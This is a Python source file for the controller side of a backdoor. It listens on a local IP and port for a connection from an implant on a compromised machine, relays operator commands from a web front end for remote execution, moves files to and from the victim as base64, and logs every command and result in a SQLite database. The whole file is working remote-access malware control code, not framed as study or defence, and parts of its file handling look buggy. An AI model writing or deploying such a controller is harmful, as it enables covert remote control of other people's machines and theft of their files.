from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from threading import Thread
import json
import base64
import sqlite3
from datetime import datetime

host = "192.168.1.53"
port = 8080

soc = socket(AF_INET, SOCK_STREAM)
soc.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
soc.bind((host, port))
soc.listen(2)

conn = sqlite3.connect('database.db')
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS commands
                  (id INTEGER PRIMARY KEY,
                  date TEXT,
                  input TEXT,
                  output TEXT)''')
conn.commit()
print("SQL connected.")

print(f"Listening for incoming connections on {host}:{port}")
connection_from_backdoor, address_backdoor = soc.accept()
print(f"[+] Connection established with {address_backdoor}, {connection_from_backdoor}")

def reliable_send(data):
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, bytes):
                data[key] = value.decode('utf-8')
    elif isinstance(data, list):
        for i in range(len(data)):
            if isinstance(data[i], bytes):
                data[i] = data[i].decode('utf-8')

    json_data = json.dumps(data)
    connection_from_backdoor.send(json_data.encode("utf-8"))

def reliable_send_web(connection_from_web,data):
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, bytes):
                data[key] = value.decode('utf-8')
    elif isinstance(data, list):
        for i in range(len(data)):
            if isinstance(data[i], bytes):
                data[i] = data[i].decode('utf-8')

    json_data = json.dumps(data)
    connection_from_web.send(json_data.encode("utf-8"))

def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + connection_from_backdoor.recv(1024).decode("utf-8")
            return json.loads(json_data)
        except ValueError:
            continue

def execute_remotely(command):
    reliable_send(command)
    input_data = " ".join(command)
    output = reliable_receive()
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''INSERT INTO commands (date, input, output)
                  VALUES (?, ?, ?)''', (date, input_data, output))
    conn.commit()
    return output

def get_file_content(path):
        print(path + ".")
        with open(path,"rb") as my_file:
            returned_value = base64.b64encode(my_file.read())
            print(returned_value)
            return returned_value



def close_connection():
    connection_from_backdoor.close()
    soc.close()

def main():
    state = True
    while state:
        # command = input(">> ")
        connection_from_web, address_web = soc.accept()
        print(f"[+] Connection established with {address_web}, {connection_from_web}")
        command = connection_from_web.recv(1024).decode("utf-8")
        print(command)
        command = command[5:-1]
        print(command)
        command = command.split(" ")

        if command[0] == "quit":
            print(command)
            reliable_send_web(connection_from_web,"Connection terminated.")
            execute_remotely(command)
            close_connection()
            state = False
            break
        
        elif command[0] == "UPLOAD":
            file_name = command[1]
            command.append(get_file_content(file_name))
            file_content = command[2]
            print(file_name)
            print(file_content)
            execute_remotely(command)


        elif command[0] == "DOWNLOAD":
            file_name = command[1]
            file_content = execute_remotely(command).encode("utf-8")
            if isinstance(file_content, bytes):
                file_content = file_content.decode("utf-8")
                file_content = base64.b64decode(file_content)
            print(file_content)
            with open(file_name, "wb") as file:
                file.write(base64.b64decode(file_content))
                print(f"[+] Download successful: {file_name}, {file_content}")



        else:
            print("Executing command: " + " ".join(command))
            result = execute_remotely(command)
            print(result)
            reliable_send_web(connection_from_web,result)

if __name__ == "__main__":
    main()